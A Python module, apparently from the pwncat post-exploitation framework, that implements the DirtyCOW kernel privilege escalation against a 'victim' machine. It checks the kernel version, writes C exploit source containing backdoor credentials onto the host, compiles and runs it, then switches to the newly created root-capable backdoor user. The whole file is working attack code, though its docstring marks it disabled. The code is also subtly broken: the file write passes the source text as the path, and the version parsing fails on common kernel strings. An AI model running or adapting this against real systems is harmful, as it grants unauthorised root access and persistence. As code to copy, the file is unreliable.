#!/usr/bin/env python3

from typing import List

import pwncat
from pwncat import gtfobins
from pwncat.gtfobins import Capability
from pwncat.privesc import BaseMethod, Technique, PrivescError


class Method_disabled(BaseMethod):
    """
    This method implements the DirtyCOW kernel privilege escalation exploit.

    It is currently disabled as it depends on an old API.
    """

    name = "dirtycow"
    BINARIES = ["cc", "uname"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(Method_disabled, self).__init__(pty)
        self.ran_before = False

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        if self.ran_before or (Capability.SHELL & capability):
            return []

        # Determine if this kernel version is vulnerable
        kernel = pwncat.victim.run("uname -r").decode("utf-8").strip()
        triplet = [int(x) for x in kernel.split(".")]
        if triplet[0] > 4:
            raise PrivescError("kernel seemingly not vulnerable")

        if triplet[0] == 4 and triplet[1] == 7 and triplet[2] >= 9:
            raise PrivescError("kernel seemingly not vulnerable")

        if triplet[0] == 4 and triplet[1] == 8 and triplet[2] >= 3:
            raise PrivescError("kernel seemingly not vulnerable")

        if triplet[0] == 4 and triplet[1] == 4 and triplet[2] >= 26:
            raise PrivescError("kernel seemingly not vulnerable")

        return [Technique("root", self, None, Capability.SHELL)]

    def execute(self, technique: Technique):
        """ Run the specified technique """

        with open("data/dirtycow/mini_dirtycow.c") as h:
            dc_source = h.read()

        dc_source = dc_source.replace(
            "PWNCAT_USER", pwncat.victim.config["backdoor_user"]
        )
        dc_source = dc_source.replace(
            "PWNCAT_PASS", pwncat.victim.config["backdoor_pass"]
        )

        self.ran_before = True

        writer = gtfobins.Binary.find_capability(pwncat.victim.which, Capability.WRITE)
        if writer is None:
            raise PrivescError("no file write methods available from gtfobins")

        dc_source_file = pwncat.victim.run("mktemp").decode("utf-8").strip()
        dc_binary = pwncat.victim.run("mktemp").decode("utf-8").strip()

        # Write the file
        pwncat.victim.run(writer.write_file(dc_source, dc_source))

        # Compile Dirtycow
        pwncat.victim.run(f"cc -pthread {dc_source_file} -o {dc_binary} -lcrypt")

        # Run Dirtycow
        pwncat.victim.run(dc_binary)

        # Reload /etc/passwd
        pwncat.victim.reload_users()

        if pwncat.victim.privesc.backdoor_user_name not in pwncat.victim.users:
            raise PrivescError("backdoor user not created")

        # Become the new user!
        pwncat.victim.run(f"su {pwncat.victim.privesc.backdoor_user_name}", wait=False)
        pwncat.victim.recvuntil(": ")

        pwncat.victim.client.send(
            pwncat.victim.privesc.backdoor_password.encode("utf-8") + b"\n"
        )

        return "exit"
